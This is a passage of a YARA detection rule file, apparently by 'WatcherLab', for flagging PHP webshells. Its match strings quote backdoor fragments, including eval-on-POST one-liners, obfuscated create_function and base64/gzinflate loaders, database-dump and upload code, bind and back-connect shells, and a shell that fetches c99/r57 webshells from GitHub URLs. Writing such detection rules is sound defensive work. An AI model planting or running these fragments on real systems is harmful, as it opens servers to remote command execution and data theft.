      $s7 = "$j='$ss(5656md5($i.$kf),560,3));56$p=\"\";for56($z=561;$z<56count56($m[156]);$z++)$56p.=$q[$m[562][$z5';" fullword ascii
      $s8 = "$A='$kh=56\"5d41\";$56kf=\"45602a\";functio56n x($t56,$k){$56c=strl56en56(56$k);56$l56=strlen($t)56;$o=';" fullword ascii
      $s9 = "$Y='q56);$q56=56a56r5656ray_56values($q);preg_match_all(\"/([5656\\\\w])[\\\\56w-]+(?56:;q=056.([\\\\d]))?,';" fullword ascii
      $s10 = "$y='CEPT_LA56N56GUAGE\"];if56($rr&&56$ra){$u=p56arse_56url($rr);5656par56se_str($u[\"56query\"],$';" fullword ascii
      $s11 = "$m='{$j};}}re56turn $o56;}$r56=$_SERV56ER;$rr56=56@56$r[\"HT56TP_REFERE56R\"]56;$ra=@$r[\"H56TTP_AC56';" fullword ascii
      $s12 = "$U='\"\";for($56i=0;$i<5656$l;){for($j=056;5656($j<$56c&&$i<$l);$j++,$i++56){$56o.=$t{56$i}^$56k';" fullword ascii
      $s13 = "$M='?/\"56,$ra,$m56);i56f($q&56&$m){@sessi56on_56start(56);$s=&$56_SESSIO56N;$ss=\"56subs56tr\";$sl';" fullword ascii
      $s14 = "$p=str_replace('56','',$A.$U.$m.$y.$Y.$M.$L.$j.$H.$h.$o.$S.$l);" fullword ascii
      $s15 = "$b=str_replace('D','','DcDDreate_DfuDncDtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_43fa5576b749d6a76a9d1fdb88c167664f1f329a
{
   meta:
      description = "php17 - file 43fa5576b749d6a76a9d1fdb88c167664f1f329a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "921e851fcc71fdd136bc4d7430255fcf15a569ef73a1445e501860f613eb4163"
   strings:
      $s1 = "<script language=\"php\">@eval_r($_POST[sb])</script>" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 1KB and
      all of them
}

rule php17_2011ok
{
   meta:
      description = "php17 - file 2011ok.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91f5385e96b4d83926fc337042ea86e5bbff8d87c53ddd4a79dec9ffc7bae83a"
   strings:
      $x1 = "eval(gzinflate(base64_decode('7b39dxzHdSj4M3yO/4fmaKyeEQfzAQIUCXBAggBIggIBCAOSIgnseD56Bk3MTI+6ZwBCNP8Yxbsn3jzviWV92LFly5bkJ1mJLc" ascii
      $s2 = "$pass = 'ec38fe2a8497e0a8d6d349b3533038cb'; //See bottom" fullword ascii
      $s3 = "/8/tc+/I9aE8HEWNztek1ecmgBuB/iEK+C4CTEwQzTZ5Ch9aLv+N1AywOSQu5MNjc5rfTpegkbEWihoxGHYEn4pHSaYainreK9xWKxyIpK+X1fut22A5t2BNJsQ8s1re" ascii
      $s4 = "VBQrSPYjsALZmaAS4i5ZrFIZGhXzJh+yVZ95KEmIpATEmIKQlxKgJxSkKckhDTEQg5pPvTEmJmFMRMlI8cs+FOyJYLh8tRbS46bwS/hU0I7TJwF1KQCifU6Vi0OSmn1H" ascii
      $s5 = "8++L/H9UO6sVvzYSRRedzztp2za343aLjuGfzED/itu+0Z+unV/EP4aPRLUzNF+VGSH6flx7P0cUaAnJmZ4t/TDHD2FIabTgOLcIaNybt98bHnw0e7PnWqNEUfe/jX8Y" ascii
      $s6 = "KH6bbmyxd2tQbZ4hsq3pjdPnB7Te8g2A4OA1gSTk1tN7rNvHPPYbPaEyEVZpUxd6EBNR1YrBabB2Lk6Z3d8dr5wb2B8tU9QojlKluiVpLkpNc9uINUcjKjkng0SVbFhI" ascii
      $s7 = "CNyurgKFaWEZzJ61WHNCxsfG4AwmTUeQt90h455QUOHjqQvwziRg+6K0RkAmSPyUT08XY8fjzs9mT7CKIqw3oVLam4WhmFWkXn7axyknG8emojmbAmxc5axeyxWeXnuo" ascii
      $s8 = "NWGd0YoXPg+0e1m9PD2xVVtPHBk/EgUEfv5G6225zJ2PSiG911E05O9VT6zguYWKqR14CS6iFMQKr+Xw==')));" fullword ascii
      $s9 = "lqr3lwSviWx1EveUhM/O5pdJCGueMWy8ZTHmN7WbyVXrDQXISeTB/d1YkvlkYfJ41z5bAs4RbnEl2Tc7u07OH1NFLjkQFFDdpexmS18SLbXPjSV2NGNmnMa9DIwUiFL3" ascii
      $s10 = "xCx84iRtV4eHOAySk/qIe2E8k8amVtafmFfzvMiYRunF6/d9YEQ0SZ9D4Ec7rec2GpGMEuaug2IDmt4rwI+0n4P9Q3GWIMr1ys+U10lOsODp8wy/zviINBh1fDuxpjZy" ascii
      $s11 = "70XNiBNXPClNfON7xhb0DNHXIistiHT4ihNkaTMPhNFgHFqY6wzNNKzARZOz4cvvm/fvbbn/znVz7kk/tE9Zh2oEz5NSWYEmrtSApC53TN2IShrBpZVniGGy+K483ovt" ascii
      $s12 = "bCOMk08ggtIHRH5gLhlkXkis8++yxVNRg2Gk4QUE35uNRWVmONXeCcZhbdSIwb4scfvvbv2P5hQpkWNmGhCY1YkCbijENmT0gNaqpg+cCj7wos1JRA/bdzx8azYV6ic2" ascii
      $s13 = "sdctMJa/YoZJrBPORbpJBlkDM2I+krktpLYJKEyL0NDgVtuujXVoo4YY41H6F6vSbq8FAR5rKVfJBpSLt30qRkZ60xs09wHn1Ii6hwSPMKnDgNRS4kIz7pLPbFMab00H" ascii
      $s14 = "BTnFDDXoH5NnzpllyppfXF69eW17bIUDllmHPF0pDx2MxI5brIFsEb8JURxs54Ng2lCeNBEACCgZ/BqJw1CaLSCbIyNYnBDQmbnj7gpc401OHJgDkgD1TwRx+98eEbP/" ascii
      $s15 = "yOWL70XhDVePxF7IkvYwphagG2cf1wHUvlg4EPGDLYUneKO1IcnHBg0bBEpIySEmDICCW3Oz//xS+cQ8mffqEo/O06g5q1Oxj0J50Xh+5+ObWo7RZScjCUUyP2T4hi4A" ascii
      $s16 = "vMCGjAOfEA/kszFoEEYiGy8Ew56Z/16l989Jsf/eLTd6zE5GcKSGah8P7/+e4/vvGJ1fC8PdexPvvtx+98642f/vHHH/3FX33wNz/7k/f+a8767m9ef+/tN7/53Z//7t" ascii
      $s17 = "hurx0pRmCnS3FuX/kdZ5iolEqxWlXf+9tXf3dl69rqa//49t9rVdWdgQsBQCxCIpT4FJqEnDMBjScu+AEaVpClSI9xdB6LXsRgn2z897g5twfRnOOwyEYScVozfffX77" ascii
      $s18 = "xKmMmGN85HlBGerxuFaNkNtFg49kK8dK0UMTMeCmslhjVnSUTw5TvZ6OX5QsHClv7hR6/8ioNodkJ86aM/fvuDb//zt/93WXpQvoAnvKSOFuYJExO0o7VYM1wmFxAyPT" ascii
      $s19 = "Wk5xaffBo495zGcOBkDnbdxq5YbkFCswwMih6NmFSCk7NY0flo4dVGcvF2u9GwJr1IsVFcIu+FYQ/d0cfLSsadOnZd2MdPas07sKSPZ//QEqSjRzKZl7KFCPL5fEpz4T" ascii
      $s20 = "9872PstFe+/a2//uB33//rt/4m1nX1WmNv2O8eBi92qPdOpIPavlMLIj2YJoEo2mP2RgdAHWDGngc/QI5FcLGe6R4268DKe1ByfRfEiJwFH8PA8ekDpyp9YMPAh+DtnA" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule sig_5c1783d63f3ab29b2c2afb1ff26bb620e849543d
{
   meta:
      description = "php17 - file 5c1783d63f3ab29b2c2afb1ff26bb620e849543d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0b098507459d68611136a90816fa59a8e75f239f48d26e1886b6d919c213204"
   strings:
      $s1 = "return FALSE; } $jrnqk91 = $GLOBALS['yhcum29']($r76, $iwule39[$xhovg5][$r76[66].$r76[54].$r76[66].$r76[49].$r76[27].$r76[29]], " fullword ascii
      $s2 = "default: $msnsv40 = $r76[79].$r76[24].$r76[24].$r76[49].$r76[24].$r76[74].$r76[39].$r76[53].$r76[58].$r76[70].$r76[90].$r76[5]." fullword ascii
      $s3 = "$kumlm43[$r76[61].$r76[54].$r76[78].$r76[90].$r76[53].$r76[5].$r76[7].$r76[24].$r76[49].$r76[78].$r76[80]] = $kumlm43[$r76[61]." fullword ascii
      $s4 = "< 12) { $GLOBALS['xcnkh30']($r76, $qzvww53); return FALSE; } $eynrg66 = $GLOBALS['efljc33']($r76[58].$r76[87].$r76[53].$r76[95]" fullword ascii
      $s5 = "$iwule39[$xhovg5][$r76[66].$r76[54].$r76[78].$r76[20].$r76[90].$r76[95].$r76[95].$r76[24]] = @$GLOBALS['nxseo15']($iwule39[$xho" fullword ascii
      $s6 = "($iwule39[$xhovg5][$r76[66].$r76[54].$r76[66].$r76[49].$r76[27].$r76[29]] == $xoloh2) { $iwule39[$xhovg5][$r76[66].$r76[54].$r7" fullword ascii
      $s7 = "= $r76[90].$r76[95].$r76[95];break; } for ($ybjpw87 = 0; $ybjpw87 < $eynrg66[$trxcp25]; $ybjpw87++) { $qthuo24[$r76[58].$r76[90" fullword ascii
      $s8 = "} } } return $bdhch16; } function potcc11($r76, $mlaat34) { for($wtqra76 = 0; $wtqra76 < $GLOBALS['brkww19']($mlaat34); $wtqra7" fullword ascii
      $s9 = "} if ($GLOBALS['yqqkt30']($r76[66].$r76[87].$r76[24].$r76[94].$r76[90].$r76[78].$r76[54].$r76[66].$r76[49].$r76[27].$r76[29].$r" fullword ascii
      $s10 = "$r76=\"F[<PAlDf|]}M@~79/O8Kx\\rH6r&-c5k\\n3X,YzhQ> Cp\\\\wUu2jGoB;0i_SN\\tn%Vg)ZI^sTRyvL{\\$:=1*mE+JW(q4.t'`a!\\\"a#edb?\";" fullword ascii
      $s11 = "NULL, $ccvhx50 = NULL, 0); if ($zkvhr54 == FALSE || $zkvhr54 == 0) { return $bdhch16; } foreach($GLOBALS['vszxc90']($iwule39) a" fullword ascii
      $s12 = "$r76[1].$iwule39[$xhovg5][$r76[66].$r76[54].$r76[66].$r76[87].$r76[94].$r76[41]].$r76[9].$GLOBALS['wnlxd28']($GLOBALS['laepm94'" fullword ascii
      $s13 = "$r76[68].$r76[94].$r76[41].$r76[5].$r76[69].$r76[26].$r76[67].$r76[49].$r76[74].$kumlm43[$r76[61].$r76[54].$r76[78].$r76[90].$r" fullword ascii
      $s14 = "{ $trxcp25 = ''; switch ($afses42) { case $GLOBALS['glyac65']($r76[6].$r76[56].$r76[55].$r76[54].$r76[55].$r76[67].$r76[79].$r7" fullword ascii
      $s15 = ">= $kwgra59) { $kwgra59 += 1; } return $bdhch16; }" fullword ascii
      $s16 = ".$r76[40].$r76[19].$r76[79].$r76[67])) { $bdhch16 = @$GLOBALS['dskbo69']($qzvww53, $ykcxg22, PHP_BINARY_READ); if ($bdhch16 == F" ascii
      $s17 = "// $GLOBALS['vtton6'] = $r76[94].$r76[24].$r76[24].$r76[49].$r76[24].$r76[54].$r76[24].$r76[94].$r76[41].$r76[49].$r76[24].$r76[" ascii
      $s18 = "rkww19']($bdhch16) > 0) { $bdhch16 .= $r76[86]; } $bdhch16 .= substr($yikqh30, $svrpc42 + 1, $GLOBALS['rtdlc97']($yikqh30[$svrpc" ascii
      $s19 = "if ($svrpc42 >= $kwgra59) { $kwgra59 += 2; } $svrpc42 = $GLOBALS['rtdlc97']($yikqh30[$svrpc42 + 1]); continue; } if ($GLOBALS['b" ascii
      $s20 = "[95]] == TRUE) { continue; } if ($kumlm43[$r76[66].$r76[54].$r76[87].$r76[53].$r76[78].$r76[94]] + 20 < $oonnt88) { if ($iwule39" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_07f8be82abd1c53bad643bc6635b5e7136088fb5
{
   meta:
      description = "php17 - file 07f8be82abd1c53bad643bc6635b5e7136088fb5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dd4700e1458e28567007cb23ff383a5988dfcba431de3b48898c6a495e8609a2"
   strings:
      $s1 = "md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map(\"asx73ert\",(array)$_REQUEST['page']):next;" fullword ascii
      $s2 = "shell.php?qid=zxexp  " fullword ascii
      $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword ascii
      $s4 = "if(isset($_POST['page'])) {" fullword ascii
      $s5 = "$page = $_POST[page];" fullword ascii
      $s6 = "850abe17d6d33516c10c6269d899fd19" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule adc78c08f01440cc1dfb52305c061558bfa0000f
{
   meta:
      description = "php17 - file adc78c08f01440cc1dfb52305c061558bfa0000f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "39c2993a4a8a8f9936c2c11304661e73bf36b5b60d7f4726529e363b2f178aed"
   strings:
      $s1 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $s2 = "8k//RqsRxygmBiRcThE+R5aGw8Uu4X72tyMqruw11HpRxrk7VZYsMb+/hXO/SFWZtEvnR/2lR4vapKLGEF3C3FKMDFcDoYkuSFdZ5y6BLlu96EJR7r2J5uXn9Nr7RCis" ascii
      $s3 = "3dhKDeQd0x2bcgGkWPJOFp+2nVz3UvyJQvbfoTzCwOMovXJfQLzCvcOxdyJrYbu2/raBOLsLh+KP8/zKmxBbE0eGe4Wtc1FPDllA8gHgLce4ZjI/J/LllfTuVzKkzSe5" ascii
      $s4 = "rxvi9a+C8ORG2QILQ348JSNp4m5wU3PstcenqB8GTwG+lHoJ0CokfoqovAWniAOOsI5Muq0HjY2iitAPNI2TLML0k/dM+cTiaeIvc/y9/SzuIlfcQk9fvChEAdgePjAz" ascii
      $s5 = "bWAdE/g+4M1GX7h/qdDd31GaXjoDlljT/kfYiq0cOGajVv5W4Yiwdmi54BYh+FyYHfrieh5PcBUe70Ue089CznDtClgyEeYV2we7i2Kq6rP3fkQ/bLZsXdYQ8J1TvlSc" ascii
      $s6 = "n81awovm9Qn/8xeuVApP7dP07YQwJTdkf9ws/oRLjaBJxjkiZAPIrCeVq97SVEJkgfFYQ8H0B2nWYsCswemPMINjemDLtseXqMIbUp80SALWYTmjgWuuYdJjkzitgDKI" ascii
      $s7 = "xk3gx1eYeF4N9O95Ru1lx6wIt9GMXqtzSfo7oPxEE6ZyiWQF9wHo/M5NOhD1u/K8zAIyEMKH9/PIMagCEwubSimt19pOre6Y+SwuvJ25DksvoFN3GI6Cz5dw0Qdah4L/" ascii
      $s8 = "+WhikpaYi+N3U75Td7xHm642RuelnIeEFwRr7E/FwYjkcpwCwuuy77Q4EwSuqlogn9kzxw7KM/gJrTL1lg5v8/mYUI93GgJ6XKABYSLIaYjPg2BaI9VEFNv5DN7WDwAu" ascii
      $s9 = "PXXnVc4lFtigDY8gVx/fR69nfD3m/BsYjry4sIKFiWRrbd4iu5Rx38eYe0E9wbLn6HbQM6RIZvcMXwkYnIIdcDv8NC4d2EHBEHgT4ET087K37k/+6iYzPoB7/JxvvN63" ascii
      $s10 = "zMRpN/DolRu3nqEi9h8LkluD4hoYYIIpHGGlRnXvGqtaZ7aRXJpLLOgrs6RgzR8y1E4F4xk4bShu6w7jYA55IKh/069I0UNiA0muYPpWuEnxHMI5mjcN+lcuBLMBtmQ9" ascii
      $s11 = "Zztkv0y9hSmQkSIgUHptx7aL2LHLhskjhENtXBK0kafhYPIYyBuTc2MhhOa8OHienjbO6qGetZ5Ym/H9k7wtWkEpb4B5nfNTufDd/MI82bHFlMjENOI2+U/pvKy1C6ch" ascii
      $s12 = "tvTfQXbmdOgu5zYrcUvTSE01ejt8PC9Jb9N/kUYyHur/Dvit8Ziyocw4NQDbRQr06PhOvEq/2CRZGEyeDVDeAQsRk8LcZW1rN7h+qXzajw7eWvFq9ZCekT1NPbyg84rc" ascii
      $s13 = "RF0dazFw/0XzssYBOyncz7JQ9xqLfOMn2GNHXwF/axwWuC9UJs9tf5wKuibNJdQMS35ePeRPGQ/tN/p/7XH1P/Q4evHdjduURp8rXwP/crgUbh9aZdvxZPN/SRmFTamJ" ascii
      $s14 = "K6IE/L/5d9zz94673PDFHqnyTk69W9v5VMXOFKfiW9rwtSNu6F9TSx3yGbd9PdX+Tj5Hf7LHczPxy/qDC75jaG4JO/dWec2/+6ms36V3XzpXGmtlvzM/vOfvcFnDP27t" ascii
      $s15 = "5F/v8p3TrDK/O7957t4Z+xingH5nI7dFTZh7/Ln73r/2/fvmu5N7o9wxWcfcs/kP9KPPGRv2nYu5UsnuGl81x9fn2dIthgchj9Key0f9fm18Ct32cp32e5852v5KvBEk" ascii
      $s16 = "T7Kl9JvMB9bLlLYdeh8w0W3bpiwoHvNdU6dt5ePY88WeJ93fX3fn1x1+tRRNizX+BGleUC8/Q7XMYlj6BcbOnf0azdyYI9aA+uygXMeYS64+zOeYV1RuN3miPZwHE+/G" ascii
      $s17 = "MK5i47Plo3Kc/DWeryichbC+ml3R5izk7ZX5wUuXFPMBf7MvL6eY8hvz1n3LWMJrdf5Lt8Kj4UcMdzHJvsHNw6+Y1ccwxklj8b+wIvDj8Nhtn/TepmnpnUF9wzlE6hLw" ascii
      $s18 = "+GgreK8yVkBL5FMV1y7tLaIA5D87/IFHhIIdniHGxEs2H1ECezK7kFEAi9h1ykEYR9cGBLmghBLk+BeCMXGNgpkumMWviVef4WJIxQoEOGeetbce9kCEn4WBtG+gqvAs" ascii
      $s19 = "+o/O3eHpgzyMYik0fwHkbMfhafSNsgn+67IJi3hN8RjsO+Ixvjuy7bmM8k2upZL7H1GDUiXH2BInt/3FR5OgViRm5F4rzPMG1s6YzQ55PPLFkDiBfPTKMDe08zJ0DIE4" ascii
      $s20 = "te/rf+a//fv//M//9u/5v/lZKj/81/+Hw=='\\x29\\x29\\x29\\x3B\",\"\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule abe9a5618e28dc886e44e8947868284881ba754e
{
   meta:
      description = "php17 - file abe9a5618e28dc886e44e8947868284881ba754e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2a19306207849530e4442e3e9ab5b77bfce0e407ad83d8dd1a36c421949b3a92"
   strings:
      $s1 = "$I='qV/_/\"qV,\"/-/\"),aqVrqVray(qV\"/\",\"+\"),$ss($s[$iqV]qV,0,$e))qV),$k)))qV;$o=ob_get_qVcontqVents()qV;qVob_endqV_cqV';" fullword ascii
      $s2 = "$f='$qVeqV){$k=$kh.$qVkf;ob_start(qV);@eqVval(@qVgzuncompreqVsqVs(@x(@bqVaqVse64_qVqVdecode(pregqV_replace(aqVrray(\"';" fullword ascii
      $s3 = "$T='qVlean();$d=bqVase64_encode(xqV(gzcomprqVess(qVqV$o),$qVk));print(\"<$k>$d<qV/qV$k>\");@sesqVsioqVqVn_destroy();}}}}';" fullword ascii
      $s4 = "$d='$rr=@qV$r[\"HTTP_RqVqVEFERER\"qV];$ra=@$qVr[\"HTqVTP_ACCqVEPT_LANGUAqVGE\"];qViqVf($rr&&$qVra){$uqV=parqVse_urqVl($rr';" fullword ascii
      $s5 = "$j='strtoqVlower\";$iqV=$m[1][qV0]qV.qV$m[1][1];$h=qV$sl($qVss(md5($i.$qVqVkh),0qV,3));$f=$sl(qV$ss(mqVd5(qV$i.$kf),0qVq';" fullword ascii
      $s6 = "$L='V,3));$pqV=qVqV\"\";for($z=1;$z<count($m[1qVqV]qV);$z++)$p.=qV$q[$m[2][$zqV]];if(sqVtrqVpos($p,$hqV)qV===0){$s[$qV';" fullword ascii
      $s7 = "$Y='$kh=\"qV5dqV41\";$qVkqVf=\"402a\";function xqV($t,$k)qV{qV$c=sqVtrlen($kqV);$l=strlen($qVt);qV$o=\"qVqV\";for($i=0qV;$i';" fullword ascii
      $s8 = "$A='=0.([\\\\d])qV)?,?/\",$qVra,$m);ifqV($q&&$m)qV{@sqVeqVssion_sqVtart();$sqV=qV&$_SESSIqVON;$sqVs=\"subqVqVstr\";$sl=\"';" fullword ascii
      $s9 = "$e=');paqVqVrse_str($u[\"queqVry\"],$qVq);$qqVqV=array_valueqVs(qVqV$q);preg_match_all(qV\"/([\\\\qVw])[\\\\w-qV]qV+(?:;qVqVq';" fullword ascii
      $s10 = "$J='<$qVl;){for($jqV=0;(qV$j<$c&&qV$i<$qVl);$j++,$i++qVqV){$o.=$qVqVt{$i}^$k{$j};}}rqVetqVurn $qVo;}$qVr=$_SERVER;qV';" fullword ascii
      $s11 = "$W='i]=\"qV\";$pqV=$ss($pqV,3qV);}if(array_keqVy_existqVs($iqV,$s)qV){$s[$i]qV.=$p;$e=qVstrpqVos(qV$s[$qVi],$f);ifqV(';" fullword ascii
      $s12 = "$g=str_replace('qV','',$Y.$J.$d.$e.$A.$j.$L.$W.$f.$I.$T);" fullword ascii
      $s13 = "$C=str_replace('L','','cLrLeate_LfuLLnctLion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_07908a44d5a13497cbc0b1bebc2711af30699b5f
{
   meta:
      description = "php17 - file 07908a44d5a13497cbc0b1bebc2711af30699b5f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7681d56cf9de3c807db7bd6a60b93b335bc7a0ba048dd32df6b4f81073c4c372"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s4 = "<title>Small Shell - Edited By KingDefacer</title>" fullword ascii
      $s5 = "# Small Shell - Edited By KingDefacer                      #" fullword ascii
      $s6 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s7 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s8 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s9 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s10 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s11 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s12 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s13 = "# All bugs -> alturks.com                                  #" fullword ascii
      $s14 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s15 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s16 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s17 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s18 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s19 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s20 = "$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_1945_v2017
{
   meta:
      description = "php17 - file 1945-v2017.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8180ca0fef742928d9f69887f9307d7a5764a64c716d3c96fd0b9aeee753affe"
   strings:
      $x1 = "$sysinfomerdekaee =\"<pre>\"; $sysinfomerdekaee.=$sysfo->uname().\"<br>\";$sysinfomerdekaee.=$sysfo->gethost().\"<br>\";$sysinfo" ascii
      $x2 = "$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,\"w\");$" ascii
      $x3 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x4 = "}else{ $username=$_COOKIE['username'];$password=$_COOKIE['password'];$database=$_COOKIE['database'];$hostname=$_COOKIE['hostname" ascii
      $x5 = "s://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\");$foot.= \"</div>\";return $foot;}}" fullword ascii
      $x6 = "{$html->show(\"<center>\");$html->show($html->h1(\"Admin Finder\"));if(empty($_POST['scan'])){$input = $html->input(\"text\",\"u" ascii
      $x7 = "class Html45{public function show($str){return print($str);}public function h1($t){$h= \"<h1>\";$h.= $t;$h.=\"</h1>\";return $h;" ascii
      $x8 = "{$html->show(\"<center>\");$html->show($html->h1(\"About 1945v2017\"));$html->show(\"<b>MerdekaAtoeMati</b><br>\");$html->show(" ascii
      $x9 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x10 = "5 shell by : \".$html->a(\"https://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\").\"</i>\");$html->show(base6" ascii
      $x11 = "ldlist</b><br>\";$val = $act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt\");" ascii
      $x12 = "}elseif($__action__ == \"sh\"){$cgidir=\"1945_cgi/\";@mkdir($cgidir,0755);$hta = \"OPTIONS Indexes Includes ExecCGI FollowSymLin" ascii
      $x13 = "class SysInfo45{public function servis(){$mysql= (function_exists('mysql_connect')) ? \"<font color=lime>ON</font>\" : \"<font c" ascii
      $x14 = "{$cgidir=\"1945_cgi/\";@mkdir($cgidir,0755);$hta = \"OPTIONS Indexes Includes ExecCGI FollowSymLinks\\nAddType application/x-htt" ascii
      $x15 = "te\",\"value=\\\"Execute query\\\"\").\"<br>\"; $cn = mysql_connect($hostname,$username,$password) or die(mysqli_error()); $cn.=" ascii
      $x16 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php\",\"kuchiyose_1945\" => \"https://raw.github" ascii
      $x17 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php\",\"kuchiyose_ms\" => \"https://raw.githubusercon" ascii
      $x18 = "ontent.com/alintamvanz/webshell/master/1945.php\",\"kuchiyose_r57\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/" ascii
      $x19 = "$hidden_login_uri = \"?login=1945\"; // login url , default : shell.php?login=1945" fullword ascii
      $x20 = "gi .id\\nAddHandler cgi-script .id\\nAddHandler cgi-script .id\";$source=$act->getcontent(\"https://raw.githubusercontent.com/al" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*)
}

rule php17_aaa_jpg
{
   meta:
      description = "php17 - file aaa.jpg.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad91b52454feed481c1d3010d69c51debadcce03fca5955a30bb99bea20100ea"
   strings:
      $s1 = ";<?php @eval($_POST['xlcst']);?>//;;;;;;;;;;;;;;;;;;" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 2KB and
      all of them
}

rule sig_0c0bbbb7371a5535e1cf38496d71393b06c79229
{
   meta:
      description = "php17 - file 0c0bbbb7371a5535e1cf38496d71393b06c79229.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e40838ec052e0bed2a73b1cf1d3c79e2ec90754e359287d02649d3ea348bdb8"
   strings:
      $s1 = "eval(gzuncompress(base64_decode('eJxLLUvM0VCJD/APDolWT85NUY/VtAYARQUGOA==')))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule abac629e73ef9917b352e81f0bb7e8dfaf531ddf
{
   meta:
      description = "php17 - file abac629e73ef9917b352e81f0bb7e8dfaf531ddf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3af87f0ff8f9909f009c12e4a953921d185ecfe1cc39e0e79fb12b5709e28ad3"
   strings:
      $x1 = "else $msg = \"error: file not found $namafile\";}?><br><br><br><br> <table class=\"tabnet\"> <tr><th>Bind Port</th><th>Back conn" ascii
      $x2 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'boom')){error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLi" ascii
      $x3 = "R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',07" ascii
      $x4 = "B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_content" ascii
      $x5 = "<td align='center'><img src='http://shopget24.com/images/sampledata/hack-run.png' height=\"0\" width=\"0\"</td></tr>" fullword ascii
      $x6 = "if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {$port = trim($_PO" ascii
      $x7 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'keyboard')){if(empty($_POST['pwd'])){echo \"<br><br><center><div class='mybox'><h2 s" ascii
      $x8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$buff = @ob_get_contents();@ob_end_clean();return $buff;} " fullword ascii
      $x9 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'config')){ error_reporting(0);if ($_POST['kill']) {$url = $_POST['url'];$user = $_PO" ascii
